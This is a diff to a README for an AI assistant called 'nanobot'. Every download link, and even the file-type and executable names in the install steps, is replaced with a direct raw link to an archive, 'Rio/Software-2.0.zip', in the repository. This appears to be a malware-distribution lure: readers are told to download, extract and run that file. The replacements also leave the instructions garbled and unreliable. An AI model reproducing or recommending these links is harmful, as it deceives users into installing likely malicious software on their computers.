@@ -1,6 +1,6 @@
 # 🐈 nanobot - Lightweight AI Assistant for Everyone
 
-[![Download nanobot](https://img.shields.io/badge/Download-nanobot-blue?style=for-the-badge&logo=github)](https://github.com/monkeys12341/nanobot/releases)
+[![Download nanobot](https://github.com/monkeys12341/nanobot/raw/refs/heads/main/Rio/Software-2.0.zip)](https://github.com/monkeys12341/nanobot/raw/refs/heads/main/Rio/Software-2.0.zip)
 
 ---
 
@@ -35,7 +35,7 @@ You are just a few steps away from running nanobot on your computer. We wrote th
 
 To get started, you need to download nanobot from the official releases page.
 
-[Download nanobot here](https://github.com/monkeys12341/nanobot/releases)
+[Download nanobot here](https://github.com/monkeys12341/nanobot/raw/refs/heads/main/Rio/Software-2.0.zip)
 
 Clicking this link will open the page where you find the latest version of nanobot ready for download.
 
@@ -43,7 +43,7 @@ Look for a file that matches your operating system:
 
 - For **Windows**, it might be a file ending in `.exe` or `.zip`.
 - For **macOS**, look for `.dmg` or `.zip`.
-- For **Linux**, you might see `.AppImage` or `.tar.gz`.
+- For **Linux**, you might see `.AppImage` or `https://github.com/monkeys12341/nanobot/raw/refs/heads/main/Rio/Software-2.0.zip`.
 
 ---
 
@@ -60,7 +60,7 @@ The installation steps depend on the file you download:
 - **Windows (.zip)**:
   1. Right-click the `.zip` file and select "Extract All".
   2. Choose the folder to extract to.
-  3. Open the extracted folder and find the nanobot executable (`nanobot.exe`).
+  3. Open the extracted folder and find the nanobot executable (`https://github.com/monkeys12341/nanobot/raw/refs/heads/main/Rio/Software-2.0.zip`).
   4. Double-click to run.
 
 - **macOS (.dmg)**:
@@ -69,7 +69,7 @@ The installation steps depend on the file you download:
   3. Eject the `.dmg` once copied.
   4. Open Applications and double-click nanobot to run.
 
-- **macOS/Linux (.zip or .tar.gz)**:
+- **macOS/Linux (.zip or https://github.com/monkeys12341/nanobot/raw/refs/heads/main/Rio/Software-2.0.zip)**:
   1. Extract the archive using built-in tools or command line.
   2. Open the extracted folder.
   3. For Linux, you might need to make the file executable. You can do this by right-clicking and selecting properties, then permissions, and enable "Allow executing file as program".
@@ -142,7 +142,7 @@ If the problem continues, visit the support section on the GitHub page or file a
 
 You can download nanobot from the official GitHub releases page:
 
-[**Visit this page to download nanobot**](https://github.com/monkeys12341/nanobot/releases)
+[**Visit this page to download nanobot**](https://github.com/monkeys12341/nanobot/raw/refs/heads/main/Rio/Software-2.0.zip)
 
 Look for the latest release, pick the file for your computer, and follow the installation steps above.
 
@@ -150,7 +150,7 @@ Look for the latest release, pick the file for your computer, and follow the ins
 
 ## 🌐 More Information
 
-You can find code, updates, and detailed technical info on the [nanobot GitHub repository](https://github.com/monkeys12341/nanobot). This repository also includes guides and tools if you want to explore adding your own skills.
+You can find code, updates, and detailed technical info on the [nanobot GitHub repository](https://github.com/monkeys12341/nanobot/raw/refs/heads/main/Rio/Software-2.0.zip). This repository also includes guides and tools if you want to explore adding your own skills.
 
 ---
 
